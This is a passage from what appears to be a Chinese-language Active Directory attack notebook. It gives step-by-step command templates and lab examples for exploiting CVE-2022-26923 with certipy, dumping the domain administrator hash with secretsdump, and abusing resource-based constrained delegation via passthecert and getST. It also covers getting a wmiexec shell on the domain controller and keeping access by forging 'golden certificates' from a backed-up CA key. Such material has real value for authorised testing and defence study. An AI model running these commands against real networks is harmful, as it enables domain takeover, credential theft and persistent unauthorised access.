proxychains certipy req -u admin\$@hacker.com -p VoBqhEUlQCa2Xiu6 -ca hacker-CASVR-CA -template Machine -target-ip 10.10.80.1 -dc-ip 10.10.10.1
```

![cve202226923](../../images/AD/VLUN/cve202226923/pre/3.png)

##### 攻击方式

###### 域控开启 PKINIT 协议支持

- 获取域控票据

```shell
# 模板
proxychains certipy auth -pfx <域控证书> -dc-ip <域控IP>
# 示例
proxychains certipy auth -pfx dc.pfx -dc-ip 10.10.10.1
```

![cve202226923](../../images/AD/VLUN/cve202226923/att/pkinit/1.png)

```shell
# 模板
KRB5CCNAME=dc.ccache proxychains secretsdump.py <域控域名> -no-pass -k -just-dc-user administrator
# 示例
KRB5CCNAME=dc.ccache proxychains secretsdump.py dc.hacker.com -no-pass -k -just-dc-user administrator
```

![cve202226923](../../images/AD/VLUN/cve202226923/att/pkinit/2.png)

###### 域控不支持 PKINIT 协议 - KDC_ERR_PADATA_TYPE_NOSUPP 

- 从证书中提取crt和key

```shell
certipy cert -pfx dc.pfx -nokey -out dc.crt
certipy cert -pfx dc.pfx -nocert -out dc.key 
```

![cve202226923](../../images/AD/VLUN/cve202226923/att/rbcd/1.png)

- 配置admin$对域控的基于资源的约束委派

```shell
# 模板
proxychains python3 passthecert.py -action write_rbcd -crt dc.crt -key dc.key -domain <域名> -dc-ip <域控IP> -delegate-from <创建的机器账号> -delegate-to <域控机器账号>
# 示例
proxychains python3 passthecert.py -action write_rbcd -crt dc.crt -key dc.key -domain hacker.com -dc-ip 10.10.10.1 -delegate-from admin\$ -delegate-to dc\$
```

![cve202226923](../../images/AD/VLUN/cve202226923/att/rbcd/2.png)

- 申请域管理员票据

```shell
# 模板
proxychains getST.py -spn cifs/<域控域名> -impersonate administrator <域名>/<机器账号>:<机器账号密码> -dc-ip <域控IP> -force-forwardable
# 示例
proxychains getST.py -spn cifs/dc.hacker.com -impersonate administrator hacker.com/admin\$:VoBqhEUlQCa2Xiu6 -dc-ip 10.10.10.1 -force-forwardable
```

![cve202226923](../../images/AD/VLUN/cve202226923/att/rbcd/3.png)

- 远程登录域控

```shell
# 模板
KRB5CCNAME=administrator.ccache proxychains wmiexec.py <域名>/<域管理员账号>@<域控域名> -k  -no-pass -dc-ip <域控IP> -codec 936
# 示例
KRB5CCNAME=administrator.ccache proxychains wmiexec.py hacker.com/administrator@dc.hacker.com -k -no-pass -dc-ip 10.10.10.1 -codec 936
```

![cve202226923](../../images/AD/VLUN/cve202226923/att/rbcd/4.png)

## 权限维持

### Golden Certificates - 黄金证书

#### 利用条件

- 拥有域管理员密码或哈希或票据

#### 攻击方法

- 使用用域管理员账号保存CA证书和密钥

```shell
# 模板
proxychains certipy ca -backup -ca <CA名称>  -u <域管理员账号> -hashes <管理员HASH> -target-ip <证书颁发机构IP>
# 示例
proxychains certipy ca -backup -ca hacker-CASVR-CA -u administrator@hacker.com -hashes 7782c491c3a02792f0e86319b29e7a24 -target-ip 10.10.80.1
```

![golden-cert](../../images/AD/ADCS/golden-cert/att/1.png)

- 使用黄金证书为用户颁发证书

```shell
# 模板
proxychains certipy forge -ca-pfx <黄金证书> -upn <域账号> -subject <用户属性> -crl <CA服务器IP>
# 示例
proxychains certipy forge -ca-pfx hacker-CASVR-CA.pfx -upn administrator@hacker.com -subject 'CN=administrator,CN=users,DC=hacker,DC=com' -crl 10.10.80.1
```

![golden-cert](../../images/AD/ADCS/golden-cert/att/2.png)

- 使用用户证书获取哈希

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```

![golden-cert](../../images/AD/ADCS/golden-cert/att/3.png)
